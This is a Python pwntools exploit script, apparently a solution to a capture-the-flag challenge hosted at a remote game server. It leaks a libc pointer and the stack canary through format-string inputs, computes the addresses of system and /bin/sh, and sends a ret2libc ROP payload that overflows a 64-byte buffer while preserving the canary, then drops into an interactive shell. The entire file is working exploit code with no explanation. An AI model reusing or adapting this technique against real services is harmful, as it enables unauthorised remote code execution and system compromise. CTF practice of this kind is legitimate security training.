from pwn import *

# Start the process
# r = process("./vault")
r = remote("play.scriptsorcerers.xyz", 10019)

# Load libc
libc = ELF("/lib/i386-linux-gnu/libc.so.6")


pop_gadjet = 0x0000101e #: pop ebx ; ret
ret_gadjet = 0x0000100a #: ret

# --- 1. Leak libc address (libcstartmain) ---
r.sendline(b"1")
r.sendline(b"%66$p")        # format string to leak a libc pointer
r.sendline(b"2")

libc_start_main = r.recvline_contains("ur stuff").decode().split("ff: ")[-1].strip()
libc_start_main = int(libc_start_main, 16)
libc_start_main -= 9
log.info(f"Leaked read address: {hex(libc_start_main)}")

# Calculate libc base
libc_base = libc_start_main - libc.symbols['__libc_start_main']
sys_addr   = libc_base + libc.symbols['system']
exit_addr  = libc_base + libc.symbols['exit']
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
puts_addr = libc_base + libc.symbols['puts']

log.info(f"Libc base: {hex(libc_base)}")
log.info(f"system: {hex(sys_addr)}")
log.info(f"exit: {hex(exit_addr)}")
log.info(f"/bin/sh: {hex(binsh_addr)}")

# --- 2. Leak stack canary ---
r.sendline(b"1")
r.sendline(b"%23$p")         # format string to leak canary
r.sendline(b"2")

canary = r.recvline_contains("ur stuff").decode().split("ff: ")[-1].strip()
canary = int(canary, 16)
log.info(f"Stack canary: {hex(canary)}")

# --- 3. Build ROP payload ---
payload = b"\0" * 64           # buffer
payload += p32(canary)        # preserve canary
payload += b'BBBB'
payload += p32(sys_addr)      # call system
payload += p32(exit_addr)
payload += p32(binsh_addr)    # argument to system

# --- 4. Send payload ---
r.sendline(b"1")
r.sendline(payload)
r.sendline(b"3")

# --- 5. Get interactive shell ---
r.interactive()
